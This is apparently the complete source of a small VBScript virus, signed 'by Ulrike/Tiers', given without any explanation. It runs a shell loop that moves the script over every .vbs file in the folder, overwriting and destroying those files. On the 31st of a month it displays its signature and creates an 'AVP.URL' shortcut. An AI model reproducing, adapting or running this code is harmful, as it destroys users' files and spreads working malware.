Set WshShell = Wscript.CreateObject("Wscript.Shell")

CommandPath = WSHShell.ExpandEnvironmentStrings("%comspec%")

WshShell.Run (CommandPath & " /c for %%a in (*.vbs) do move /y " & Wscript.ScriptFullName & " %%a >nul")

If Day(Now()) = 31 Then

WScript.Echo "Ulrike" & Chr(16) & "by Ulrike/Tiers"

Set oUrlLink = WshShell.CreateShortcut("AVP.URL")
oUrlLink.TargetPath = "http://www.avp.com"
oUrlLink.Save

End If
